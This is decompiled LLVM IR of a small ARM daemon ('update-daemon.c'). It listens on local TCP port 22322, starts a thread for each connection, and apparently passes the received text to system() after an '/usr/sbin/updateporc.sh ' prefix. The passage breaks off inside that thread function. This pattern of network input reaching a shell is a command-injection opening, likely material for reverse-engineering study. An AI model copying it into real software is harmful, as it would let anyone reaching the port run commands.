source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_IO_FILE = type { i32 }
%sockaddr = type { i32, [14 x i8] }

@global_var_2200c = local_unnamed_addr global i32 67416
@global_var_22010 = local_unnamed_addr global i32 67416
@global_var_22014 = local_unnamed_addr global i32 67416
@global_var_22018 = local_unnamed_addr global i32 67416
@global_var_2201c = local_unnamed_addr global i32 67416
@global_var_22020 = local_unnamed_addr global i32 67416
@global_var_22024 = local_unnamed_addr global i32 67416
@global_var_22028 = local_unnamed_addr global i32 67416
@global_var_2202c = local_unnamed_addr global i32 67416
@global_var_22030 = local_unnamed_addr global i32 67416
@global_var_22034 = local_unnamed_addr global i32 67416
@global_var_22038 = local_unnamed_addr global i32 67416
@global_var_2203c = local_unnamed_addr global i32 67416
@global_var_22040 = local_unnamed_addr global i32 67416
@global_var_22044 = local_unnamed_addr global i32 67416
@global_var_22048 = local_unnamed_addr global i32 67416
@global_var_2204c = local_unnamed_addr global i32 67416
@global_var_22050 = local_unnamed_addr global i32 67416
@global_var_22054 = local_unnamed_addr global i32 67416
@global_var_22058 = local_unnamed_addr global i32 67416
@global_var_2205c = local_unnamed_addr global i32 67416
@global_var_22060 = local_unnamed_addr global i32 67416
@global_var_22064 = local_unnamed_addr global i32 67416
@global_var_22068 = local_unnamed_addr global i32 67416
@global_var_2206c = local_unnamed_addr global i32 67416
@global_var_22070 = local_unnamed_addr global i32 67416
@global_var_22074 = local_unnamed_addr global i32 67416
@global_var_22078 = local_unnamed_addr global i32 67416
@global_var_2207c = local_unnamed_addr global i32 67416
@global_var_1140c = constant [8 x i8] c"daemonc\00"
@global_var_11414 = constant [8 x i8] c"daemons\00"
@global_var_113dc = constant [10 x i8] c"127.0.0.1\00"
@global_var_113e8 = constant [6 x i8] c"22322\00"
@global_var_11440 = constant [29 x i8] c"Will Listening To Port[%d]\0D\0A\00"
@global_var_11480 = constant [30 x i8] c"waiting for new connection...\00"
@global_var_114b0 = constant [25 x i8] c"A new connection occurs!\00"
@global_var_114cc = constant [23 x i8] c"pthread_create error!\0A\00"
@global_var_114f0 = constant [18 x i8] c"Server shuts down\00"
@global_var_114a0 = constant [15 x i8] c"Accept error!\0A\00"
@global_var_11504 = constant [22 x i8] c"Cannot Find Command!\0D\00"
@global_var_1141c = constant [16 x i8] c"update-daemon.c\00"
@global_var_114e4 = constant [10 x i8] c"ret != -1\00"
@global_var_10b14 = local_unnamed_addr constant i32 70428
@global_var_1131c = constant [14 x i8] c"ProcessServer\00"
@global_var_1142c = constant [20 x i8] c"sockfd_server != -1\00"
@global_var_11470 = constant [15 x i8] c"listen error!\0A\00"
@global_var_11460 = constant [13 x i8] c"bind error!\0A\00"
@global_var_10b64 = local_unnamed_addr constant i32 70824
@global_var_114a8 = constant [7 x i8] c"rror!\0A\00"
@global_var_10b68 = local_unnamed_addr constant i32 128
@global_var_10b58 = constant i32 -481165312
@global_var_1132c = constant [13 x i8] c"New Thread!\0D\00"
@global_var_1133c = constant [12 x i8] c"Recv:'%s'\0D\0A\00"
@global_var_10f1c = local_unnamed_addr constant [25 x i8] c"/usr/sbin/updateporc.sh \00"
@global_var_10f20 = local_unnamed_addr constant [21 x i8] c"/sbin/updateporc.sh \00"
@global_var_10f24 = local_unnamed_addr constant [17 x i8] c"n/updateporc.sh \00"
@global_var_10f28 = local_unnamed_addr constant [13 x i8] c"dateporc.sh \00"
@global_var_10f2c = local_unnamed_addr constant [9 x i8] c"porc.sh \00"
@global_var_10f30 = local_unnamed_addr constant [5 x i8] c".sh \00"
@global_var_113cc = local_unnamed_addr constant [14 x i8] c"Come On WUHAN\00"
@global_var_113d0 = local_unnamed_addr constant [10 x i8] c" On WUHAN\00"
@global_var_113d4 = local_unnamed_addr constant [6 x i8] c"WUHAN\00"
@global_var_11358 = constant [21 x i8] c"system status:[%d]\0D\0A\00"
@global_var_11370 = constant [26 x i8] c"Shell Exec Successfully!\0D\00"
@global_var_113b0 = constant [21 x i8] c"Other Exit Ret[%d]\0D\0A\00"
@global_var_113c8 = constant [4 x i8] c"6%d\00"
@global_var_11348 = constant [13 x i8] c"system err!\0D\00"
@global_var_1138c = constant [32 x i8] c"Shell Execute Failed, Ret[%d]\0D\0A\00"
@global_var_113ac = constant [3 x i8] c"%d\00"
@global_var_113f0 = constant [12 x i8] c"socket err:\00"
@global_var_113fc = constant [13 x i8] c"connect err:\00"
@global_var_10f04 = local_unnamed_addr constant i32 69674
@global_var_1102a = constant i32 0
@global_var_10f08 = local_unnamed_addr constant i32 69664
@global_var_11020 = local_unnamed_addr constant i32 0
@global_var_21f08 = global i32 68565
@0 = external global i32
@global_var_22090 = local_unnamed_addr global %_IO_FILE* null
@global_var_10b40 = local_unnamed_addr constant void ()* inttoptr (i32 67784 to void ()*)
@global_var_10b44 = local_unnamed_addr constant void ()* inttoptr (i32 69329 to void ()*)
@global_var_10f34 = local_unnamed_addr constant i8 0
@global_var_113d8 = local_unnamed_addr constant i16 78

declare i32 @unknown_240() local_unnamed_addr

define i32 @function_1074c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1074c:
  %0 = call i32 @function_10b48(), !insn.addr !0
  ret i32 %0, !insn.addr !1
}

define i8* @function_1076c(i8* %haystack, i8* %needle) local_unnamed_addr {
dec_label_pc_1076c:
  %0 = call i8* @strstr(i8* %haystack, i8* %needle), !insn.addr !2
  ret i8* %0, !insn.addr !2
}

define i32 @function_10778(i8* %format, ...) local_unnamed_addr {
dec_label_pc_10778:
  %0 = call i32 (i8*, ...) @printf(i8* %format), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i32 @function_10784(i32 %fd, i32* %buf, i32 %nbytes) local_unnamed_addr {
dec_label_pc_10784:
  %0 = call i32 @read(i32 %fd, i32* %buf, i32 %nbytes), !insn.addr !4
  ret i32 %0, !insn.addr !4
}

define void @function_10790(i8* %s) local_unnamed_addr {
dec_label_pc_10790:
  call void @perror(i8* %s), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @function_1079c(i32 %fd, %sockaddr* %addr, i32* %addr_len) local_unnamed_addr {
dec_label_pc_1079c:
  %0 = call i32 @accept(i32 %fd, %sockaddr* %addr, i32* %addr_len), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i32 @function_107a8(i32* %ptr, i32 %size, i32 %n, %_IO_FILE* %s) local_unnamed_addr {
dec_label_pc_107a8:
  %0 = call i32 @fwrite(i32* %ptr, i32 %size, i32 %n, %_IO_FILE* %s), !insn.addr !7
  ret i32 %0, !insn.addr !7
}

define i8* @function_107b4(i8* %dest, i8* %src) local_unnamed_addr {
dec_label_pc_107b4:
  %0 = call i8* @strcpy(i8* %dest, i8* %src), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @function_107c0(i32* %newthread, i32* %attr, i32* (i32*)* %start_routine, i32* %arg) local_unnamed_addr {
dec_label_pc_107c0:
  %0 = call i32 @pthread_create(i32* %newthread, i32* %attr, i32* (i32*)* %start_routine, i32* %arg), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define i32 @function_107cc(i8* %s) local_unnamed_addr {
dec_label_pc_107cc:
  %0 = call i32 @puts(i8* %s), !insn.addr !10
  ret i32 %0, !insn.addr !10
}

define i32 @function_107d8(i32 %main, i32 %argc, i8** %ubp_av, void ()* %init, void ()* %fini, void ()* %rtld_fini) local_unnamed_addr {
dec_label_pc_107d8:
  %0 = call i32 @__libc_start_main(i32 %main, i32 %argc, i8** %ubp_av, void ()* %init, void ()* %fini, void ()* %rtld_fini), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @function_107e4(i8* %command) local_unnamed_addr {
dec_label_pc_107e4:
  %0 = call i32 @system(i8* %command), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define void @function_107f0() local_unnamed_addr {
dec_label_pc_107f0:
  call void @__gmon_start__(), !insn.addr !13
  ret void, !insn.addr !13
}

define void @function_107fc(i32 %status) local_unnamed_addr {
dec_label_pc_107fc:
  call void @exit(i32 %status), !insn.addr !14
  ret void, !insn.addr !14
}

define i32 @function_10808(i8* %s) local_unnamed_addr {
dec_label_pc_10808:
  %0 = call i32 @strlen(i8* %s), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define i32 @function_10814(i32 %fd, %sockaddr* %addr, i32 %len) local_unnamed_addr {
dec_label_pc_10814:
  %0 = call i32 @bind(i32 %fd, %sockaddr* %addr, i32 %len), !insn.addr !16
  ret i32 %0, !insn.addr !16
}

define i32* @function_10820(i32* %s, i32 %c, i32 %n) local_unnamed_addr {
dec_label_pc_10820:
  %0 = call i32* @memset(i32* %s, i32 %c, i32 %n), !insn.addr !17
  ret i32* %0, !insn.addr !17
}

define i32 @function_1082c(i32 %fd, i32* %buf, i32 %n) local_unnamed_addr {
dec_label_pc_1082c:
  %0 = call i32 @write(i32 %fd, i32* %buf, i32 %n), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define void @function_10838(i32* %retval) local_unnamed_addr {
dec_label_pc_10838:
  call void @pthread_exit(i32* %retval), !insn.addr !19
  ret void, !insn.addr !19
}

define i32 @function_10844(i32 %fd, i32 %how) local_unnamed_addr {
dec_label_pc_10844:
  %0 = call i32 @shutdown(i32 %fd, i32 %how), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32 @function_10850(i32 %fd, i32 %n) local_unnamed_addr {
dec_label_pc_10850:
  %0 = call i32 @listen(i32 %fd, i32 %n), !insn.addr !21
  ret i32 %0, !insn.addr !21
}

define i32 @function_1085c(i8* %s, i8* %format, ...) local_unnamed_addr {
dec_label_pc_1085c:
  %0 = call i32 (i8*, i8*, ...) @sprintf(i8* %s, i8* %format), !insn.addr !22
  ret i32 %0, !insn.addr !22
}

define i32 @function_10868(i32 %domain, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_10868:
  %0 = call i32 @socket(i32 %domain, i32 %type, i32 %protocol), !insn.addr !23
  ret i32 %0, !insn.addr !23
}

define i32 @function_10874(i8* %cp) local_unnamed_addr {
dec_label_pc_10874:
  %0 = call i32 @inet_addr(i8* %cp), !insn.addr !24
  ret i32 %0, !insn.addr !24
}

define void @function_10880() local_unnamed_addr {
dec_label_pc_10880:
  call void @abort(), !insn.addr !25
  ret void, !insn.addr !25
}

define i32 @function_1088c(i32 %fd, i32* %buf, i32 %n, i32 %flags) local_unnamed_addr {
dec_label_pc_1088c:
  %0 = call i32 @recv(i32 %fd, i32* %buf, i32 %n, i32 %flags), !insn.addr !26
  ret i32 %0, !insn.addr !26
}

define i32 @function_10898(i32 %fd) local_unnamed_addr {
dec_label_pc_10898:
  %0 = call i32 @close(i32 %fd), !insn.addr !27
  ret i32 %0, !insn.addr !27
}

define i32 @function_108a4(i32 %fd, i32* %buf, i32 %n, i32 %flags) local_unnamed_addr {
dec_label_pc_108a4:
  %0 = call i32 @send(i32 %fd, i32* %buf, i32 %n, i32 %flags), !insn.addr !28
  ret i32 %0, !insn.addr !28
}

define i32 @function_108b0(i32 %fd, %sockaddr* %addr, i32 %len) local_unnamed_addr {
dec_label_pc_108b0:
  %0 = call i32 @connect(i32 %fd, %sockaddr* %addr, i32 %len), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define void @function_108bc(i8* %assertion, i8* %file, i32 %line, i8* %function) local_unnamed_addr {
dec_label_pc_108bc:
  call void @__assert_fail(i8* %assertion, i8* %file, i32 %line, i8* %function), !insn.addr !30
  ret void, !insn.addr !30
}

define i32 @function_108c8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_108c8:
  %r0.0.reg2mem = alloca i32, !insn.addr !31
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i16, align 2
  %0 = inttoptr i32 %arg2 to i8*, !insn.addr !32
  %1 = call i8* @strstr(i8* %0, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1140c, i32 0, i32 0)), !insn.addr !32
  %2 = icmp eq i8* %1, null, !insn.addr !33
  br i1 %2, label %dec_label_pc_108f0, label %dec_label_pc_10a50, !insn.addr !34

dec_label_pc_108f0:                               ; preds = %dec_label_pc_108c8
  %3 = call i8* @strstr(i8* %0, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_11414, i32 0, i32 0)), !insn.addr !35
  %4 = icmp eq i8* %3, null, !insn.addr !36
  br i1 %4, label %dec_label_pc_10a78, label %dec_label_pc_10908, !insn.addr !37

dec_label_pc_10908:                               ; preds = %dec_label_pc_108f0
  %5 = ptrtoint i8* %1 to i32, !insn.addr !32
  %6 = call i32 @socket(i32 2, i32 1, i32 %5), !insn.addr !38
  %7 = icmp eq i32 %6, -1, !insn.addr !39
  br i1 %7, label %dec_label_pc_10aa8, label %dec_label_pc_10924, !insn.addr !40

dec_label_pc_10924:                               ; preds = %dec_label_pc_10908
  store i16 2, i16* %stack_var_-56, align 2, !insn.addr !41
  %8 = call i32 @inet_addr(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_113dc, i32 0, i32 0)), !insn.addr !42
  %9 = call i32 @function_10bd8(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_113e8, i32 0, i32 0)), !insn.addr !43
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @global_var_11440, i32 0, i32 0), i32 %9), !insn.addr !44
  %11 = bitcast i16* %stack_var_-56 to %sockaddr*, !insn.addr !45
  %12 = call i32 @bind(i32 %6, %sockaddr* nonnull %11, i32 16), !insn.addr !45
  %13 = icmp eq i32 %12, -1, !insn.addr !46
  br i1 %13, label %dec_label_pc_10aec, label %dec_label_pc_10988, !insn.addr !47

dec_label_pc_10988:                               ; preds = %dec_label_pc_10924
  %14 = call i32 @listen(i32 %6, i32 512), !insn.addr !48
  %15 = icmp eq i32 %14, -1, !insn.addr !49
  br i1 %15, label %dec_label_pc_10ac4, label %dec_label_pc_109bc.preheader, !insn.addr !50

dec_label_pc_109bc.preheader:                     ; preds = %dec_label_pc_10988
  %16 = bitcast i32* %stack_var_-40 to %sockaddr*
  br label %dec_label_pc_109bc

dec_label_pc_109bc:                               ; preds = %dec_label_pc_109bc.backedge, %dec_label_pc_109bc.preheader
  %17 = call i32 @puts(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @global_var_11480, i32 0, i32 0)), !insn.addr !51
  store i32 16, i32* %stack_var_-64, align 4, !insn.addr !52
  %18 = call i32 @accept(i32 %6, %sockaddr* nonnull %16, i32* nonnull %stack_var_-64), !insn.addr !53
  %19 = icmp eq i32 %18, -1, !insn.addr !54
  store i32 %18, i32* %stack_var_-68, align 4, !insn.addr !55
  br i1 %19, label %dec_label_pc_10a5c, label %dec_label_pc_109e8, !insn.addr !56

dec_label_pc_109e8:                               ; preds = %dec_label_pc_109bc
  %20 = call i32 @puts(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_114b0, i32 0, i32 0)), !insn.addr !57
  %21 = call i32 @pthread_create(i32* nonnull %stack_var_-60, i32* null, i32* (i32*)* inttoptr (i32 68644 to i32* (i32*)*), i32* nonnull %stack_var_-68), !insn.addr !58
  %22 = icmp eq i32 %21, -1, !insn.addr !59
  br i1 %22, label %dec_label_pc_10a0c, label %dec_label_pc_109bc.backedge, !insn.addr !60

dec_label_pc_10a0c:                               ; preds = %dec_label_pc_109e8
  %23 = load %_IO_FILE*, %_IO_FILE** @global_var_22090, align 4, !insn.addr !61
  %24 = call i32 @fwrite(i32* bitcast ([23 x i8]* @global_var_114cc to i32*), i32 1, i32 22, %_IO_FILE* %23), !insn.addr !62
  %25 = call i32 @shutdown(i32 %6, i32 1), !insn.addr !63
  %26 = icmp eq i32 %25, -1, !insn.addr !64
  br i1 %26, label %dec_label_pc_10a8c, label %dec_label_pc_10a38, !insn.addr !65

dec_label_pc_10a38:                               ; preds = %dec_label_pc_10a0c
  %27 = call i32 @puts(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_114f0, i32 0, i32 0)), !insn.addr !66
  store i32 0, i32* %r0.0.reg2mem, !insn.addr !67
  br label %dec_label_pc_10a48, !insn.addr !67

dec_label_pc_10a48:                               ; preds = %dec_label_pc_10a78, %dec_label_pc_10a50, %dec_label_pc_10a38
  %r0.0.reload = load i32, i32* %r0.0.reg2mem
  ret i32 %r0.0.reload, !insn.addr !68

dec_label_pc_10a50:                               ; preds = %dec_label_pc_108c8
  %28 = add i32 %arg2, 4, !insn.addr !69
  %29 = inttoptr i32 %28 to i32*, !insn.addr !69
  %30 = load i32, i32* %29, align 4, !insn.addr !69
  %31 = call i32 @function_10db8(i32 %30), !insn.addr !70
  store i32 %31, i32* %r0.0.reg2mem, !insn.addr !71
  br label %dec_label_pc_10a48, !insn.addr !71

dec_label_pc_10a5c:                               ; preds = %dec_label_pc_109bc
  %32 = load %_IO_FILE*, %_IO_FILE** @global_var_22090, align 4, !insn.addr !72
  %33 = call i32 @fwrite(i32* bitcast ([15 x i8]* @global_var_114a0 to i32*), i32 1, i32 14, %_IO_FILE* %32), !insn.addr !73
  br label %dec_label_pc_109bc.backedge, !insn.addr !74

dec_label_pc_109bc.backedge:                      ; preds = %dec_label_pc_10a5c, %dec_label_pc_109e8
  br label %dec_label_pc_109bc

dec_label_pc_10a78:                               ; preds = %dec_label_pc_108f0
  %34 = call i32 @puts(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_11504, i32 0, i32 0)), !insn.addr !75
  store i32 -1, i32* %r0.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_10a48, !insn.addr !76

dec_label_pc_10a8c:                               ; preds = %dec_label_pc_10a0c
  call void @__assert_fail(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_114e4, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1141c, i32 0, i32 0), i32 171, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1131c, i32 0, i32 0)), !insn.addr !77
  br label %dec_label_pc_10aa8, !insn.addr !77

dec_label_pc_10aa8:                               ; preds = %dec_label_pc_10a8c, %dec_label_pc_10908
  call void @__assert_fail(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1142c, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1141c, i32 0, i32 0), i32 129, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1131c, i32 0, i32 0)), !insn.addr !78
  br label %dec_label_pc_10ac4, !insn.addr !78

dec_label_pc_10ac4:                               ; preds = %dec_label_pc_10aa8, %dec_label_pc_10988
  %35 = load %_IO_FILE*, %_IO_FILE** @global_var_22090, align 4, !insn.addr !79
  %36 = call i32 @fwrite(i32* bitcast ([15 x i8]* @global_var_11470 to i32*), i32 1, i32 14, %_IO_FILE* %35), !insn.addr !80
  call void @exit(i32 1), !insn.addr !81
  unreachable, !insn.addr !81

dec_label_pc_10aec:                               ; preds = %dec_label_pc_10924
  %37 = load %_IO_FILE*, %_IO_FILE** @global_var_22090, align 4, !insn.addr !82
  %38 = call i32 @fwrite(i32* bitcast ([13 x i8]* @global_var_11460 to i32*), i32 1, i32 12, %_IO_FILE* %37), !insn.addr !83
  call void @exit(i32 1), !insn.addr !84
  ret i32 ptrtoint (i32* @0 to i32), !insn.addr !84

; uselistorder directives
  uselistorder i32 %18, { 1, 0 }
  uselistorder i8* %1, { 1, 0 }
  uselistorder i32* %r0.0.reg2mem, { 3, 1, 0, 2 }
  uselistorder void (i32)* @exit, { 1, 0, 2 }
  uselistorder void (i8*, i8*, i32, i8*)* @__assert_fail, { 1, 0, 2 }
  uselistorder i32 (i32*, i32, i32, %_IO_FILE*)* @fwrite, { 3, 2, 1, 0, 4 }
  uselistorder %_IO_FILE** @global_var_22090, { 3, 2, 1, 0 }
  uselistorder i8* (i8*, i8*)* @strstr, { 1, 0, 2 }
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10b18:
  %stack_var_4 = alloca i32, align 4
  %0 = bitcast i32* %stack_var_4 to i8**, !insn.addr !85
  %1 = inttoptr i32 %arg1 to void ()*, !insn.addr !85
  %2 = call i32 @__libc_start_main(i32 67784, i32 %arg2, i8** nonnull %0, void ()* inttoptr (i32 69329 to void ()*), void ()* inttoptr (i32 67784 to void ()*), void ()* %1), !insn.addr !85
  call void @abort(), !insn.addr !86
  unreachable, !insn.addr !86
}

define i32 @function_10b3c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10b3c:
  ret i32 %arg1, !insn.addr !87
}

define i32 @function_10b48() local_unnamed_addr {
dec_label_pc_10b48:
  %0 = alloca i32
  %1 = load i32, i32* %0
  %2 = load i32, i32* inttoptr (i32 add (i32 add (i32 ptrtoint (i32* @global_var_10b58 to i32), i32 ptrtoint ([7 x i8]* @global_var_114a8 to i32)), i32 128) to i32*), align 4, !insn.addr !88
  %3 = icmp eq i32 %2, 0, !insn.addr !89
  br i1 %3, label %4, label %dec_label_pc_10b60, !insn.addr !90

; <label>:4:                                      ; preds = %dec_label_pc_10b48
  ret i32 %1, !insn.addr !90

dec_label_pc_10b60:                               ; preds = %dec_label_pc_10b48
  call void @__gmon_start__(), !insn.addr !91
  ret i32 ptrtoint (i32* @0 to i32), !insn.addr !91
}

define i32 @function_10b6c(i32 %arg1, i32 %arg2, i32 %arg3, i8 %arg4) local_unnamed_addr {
dec_label_pc_10b6c:
  %0 = alloca i32
  %1 = alloca i1
  %2 = alloca double
  %cpsr_n.01.reg2mem = alloca i1, !insn.addr !92
  %3 = load i1, i1* %1
  %4 = load i1, i1* %1
  %5 = load i1, i1* %1
  %6 = load i32, i32* %0
  %7 = load double, double* %2
  %8 = load double, double* %2
  br i1 %4, label %9, label %dec_label_pc_10b88, !insn.addr !92

; <label>:9:                                      ; preds = %dec_label_pc_10b6c
  ret i32 %arg1, !insn.addr !92

dec_label_pc_10b88:                               ; preds = %dec_label_pc_10b6c
  %10 = icmp eq i1 %5, %3, !insn.addr !93
  br i1 %10, label %dec_label_pc_10b9c, label %11, !insn.addr !93

; <label>:11:                                     ; preds = %dec_label_pc_10b88
  call void @__asm_svclt(i32 18288), !insn.addr !93
  br label %dec_label_pc_10b9c, !insn.addr !93

dec_label_pc_10b9c:                               ; preds = %11, %dec_label_pc_10b88
  br i1 %3, label %dec_label_pc_10bb4, label %12, !insn.addr !94

; <label>:12:                                     ; preds = %dec_label_pc_10b9c
  %13 = mul i32 %6, 1048577, !insn.addr !95
  %14 = mul i32 %6, 4194304, !insn.addr !94
  %15 = sub i32 0, %14
  %16 = sub i32 %15, 1
  %17 = and i32 %13, %16, !insn.addr !94
  %18 = icmp slt i32 %17, 0, !insn.addr !94
  %19 = icmp eq i32 %17, 0, !insn.addr !94
  store i1 %18, i1* %cpsr_n.01.reg2mem, !insn.addr !96
  br i1 %19, label %20, label %dec_label_pc_10bb4, !insn.addr !96

; <label>:20:                                     ; preds = %12
  %21 = call i32 @unknown_240(), !insn.addr !96
  ret i32 %21, !insn.addr !96

dec_label_pc_10bb4:                               ; preds = %dec_label_pc_10b9c, %12
  %cpsr_n.01.reload = load i1, i1* %cpsr_n.01.reg2mem
  %22 = icmp eq i1 %cpsr_n.01.reload, %3, !insn.addr !97
  br i1 %22, label %24, label %23, !insn.addr !97

; <label>:23:                                     ; preds = %dec_label_pc_10bb4
  call void @__asm_svclt(i32 18288), !insn.addr !97
  br label %24, !insn.addr !97

; <label>:24:                                     ; preds = %dec_label_pc_10bb4, %23
  %25 = call double @__asm_vqrshl.s8(double %8, double %7), !insn.addr !98
  ret i32 %arg1, !insn.addr !98

; uselistorder directives
  uselistorder i32 %6, { 1, 0 }
  uselistorder i1 %3, { 2, 1, 0 }
  uselistorder double* %2, { 1, 0 }
  uselistorder i1* %1, { 2, 1, 0 }
  uselistorder label %24, { 1, 0 }
  uselistorder label %dec_label_pc_10bb4, { 1, 0 }
}

define i32 @function_10bc0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10bc0:
  %r0.0.reg2mem = alloca i32, !insn.addr !99
  %0 = mul i32 %arg3, 262144, !insn.addr !99
  %1 = or i32 %0, 131072, !insn.addr !100
  %2 = inttoptr i32 %1 to i8*, !insn.addr !101
  %3 = load i8, i8* %2, align 131072, !insn.addr !101
  %4 = icmp eq i8 %3, 0, !insn.addr !102
  store i32 %arg1, i32* %r0.0.reg2mem, !insn.addr !102
  br i1 %4, label %dec_label_pc_10bca, label %dec_label_pc_10bd2, !insn.addr !102

dec_label_pc_10bca:                               ; preds = %dec_label_pc_10bc0
  %5 = call i32 @function_10b6c(i32 %arg1, i32 %arg2, i32 %arg3, i8 0), !insn.addr !103
  store i8 1, i8* %2, align 131072, !insn.addr !104
  store i32 %5, i32* %r0.0.reg2mem, !insn.addr !104
  br label %dec_label_pc_10bd2, !insn.addr !104

dec_label_pc_10bd2:                               ; preds = %dec_label_pc_10bc0, %dec_label_pc_10bca
  %r0.0.reload = load i32, i32* %r0.0.reg2mem
  ret i32 %r0.0.reload, !insn.addr !105

; uselistorder directives
  uselistorder i32* %r0.0.reg2mem, { 0, 2, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10bd2, { 1, 0 }
}

define i32 @function_10bd4() local_unnamed_addr {
dec_label_pc_10bd4:
  %0 = alloca i32
  %1 = load i32, i32* %0
  ret i32 %1, !insn.addr !106
}

define i32 @function_10bd8(i8* %arg1) local_unnamed_addr {
dec_label_pc_10bd8:
  %.lcssa.reg2mem = alloca i32, !insn.addr !107
  %r2.01.reg2mem = alloca i32, !insn.addr !107
  %.reg2mem = alloca i32, !insn.addr !107
  %0 = ptrtoint i8* %arg1 to i32
  %1 = call i32 @strlen(i8* %arg1), !insn.addr !108
  %2 = add i32 %0, -2, !insn.addr !109
  %3 = add i32 %2, %1, !insn.addr !110
  %4 = add i32 %0, -1
  %5 = icmp eq i32 %4, %3, !insn.addr !111
  store i32 -48, i32* %.reg2mem, !insn.addr !112
  store i32 %4, i32* %r2.01.reg2mem, !insn.addr !112
  store i32 -48, i32* %.lcssa.reg2mem, !insn.addr !112
  br i1 %5, label %dec_label_pc_10c18, label %dec_label_pc_10bfc, !insn.addr !112

dec_label_pc_10bfc:                               ; preds = %dec_label_pc_10bd8, %dec_label_pc_10bfc
  %r2.01.reload = load i32, i32* %r2.01.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %6 = add i32 %r2.01.reload, 1, !insn.addr !113
  %7 = inttoptr i32 %6 to i8*, !insn.addr !113
  %8 = load i8, i8* %7, align 1, !insn.addr !113
  %9 = zext i8 %8 to i32, !insn.addr !113
  %10 = add i32 %.reload, %9, !insn.addr !114
  %11 = mul i32 %10, 10, !insn.addr !115
  %12 = icmp eq i32 %6, %3, !insn.addr !111
  %13 = add i32 %11, -48, !insn.addr !116
  store i32 %13, i32* %.reg2mem, !insn.addr !112
  store i32 %6, i32* %r2.01.reg2mem, !insn.addr !112
  store i32 %13, i32* %.lcssa.reg2mem, !insn.addr !112
  br i1 %12, label %dec_label_pc_10c18, label %dec_label_pc_10bfc, !insn.addr !112

dec_label_pc_10c18:                               ; preds = %dec_label_pc_10bfc, %dec_label_pc_10bd8
  %.lcssa.reload = load i32, i32* %.lcssa.reg2mem
  %14 = add i32 %1, %4, !insn.addr !117
  %15 = inttoptr i32 %14 to i8*, !insn.addr !117
  %16 = load i8, i8* %15, align 1, !insn.addr !117
  %17 = zext i8 %16 to i32, !insn.addr !117
  %18 = add i32 %.lcssa.reload, %17, !insn.addr !118
  ret i32 %18, !insn.addr !119

; uselistorder directives
  uselistorder i32 %4, { 1, 0, 2 }
  uselistorder i32 %3, { 1, 0 }
  uselistorder i32 %0, { 1, 0 }
  uselistorder i32* %.reg2mem, { 2, 0, 1 }
  uselistorder i32* %r2.01.reg2mem, { 2, 0, 1 }
  uselistorder i32 -48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10bfc, { 1, 0 }
}

define i32 @function_10c24(i32 %arg1) local_unnamed_addr {
dec_label_pc_10c24:
  %r6.1.reg2mem = alloca i32, !insn.addr !120
  %.pre-phi.reg2mem = alloca i8*, !insn.addr !120
  %r6.0.reg2mem = alloca i32, !insn.addr !120
  %stack_var_-1015 = alloca i32, align 4
  %stack_var_-1016 = alloca i8, align 1
  %stack_var_-1040 = alloca i8*, align 4
  %stack_var_-2064 = alloca i32, align 4
  %stack_var_-2060 = alloca i32, align 4
  %stack_var_-2080 = alloca i32, align 4
  %0 = call i32 @puts(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1132c, i32 0, i32 0)), !insn.addr !121
  store i32 0, i32* %stack_var_-2064, align 4, !insn.addr !122
  %1 = call i32* @memset(i32* nonnull %stack_var_-2060, i32 0, i32 1020), !insn.addr !123
  %2 = ptrtoint i32* %1 to i32, !insn.addr !123
  %3 = call i32 @read(i32 %2, i32* nonnull %stack_var_-2064, i32 1024), !insn.addr !124
  %4 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1133c, i32 0, i32 0), i32* nonnull %stack_var_-2064), !insn.addr !125
  store i8* inttoptr (i32 1920169263 to i8*), i8** %stack_var_-1040, align 4, !insn.addr !126
  store i8 0, i8* %stack_var_-1016, align 1, !insn.addr !127
  %5 = call i32* @memset(i32* nonnull %stack_var_-1015, i32 0, i32 999), !insn.addr !128
  %6 = bitcast i32* %stack_var_-2064 to i8*, !insn.addr !129
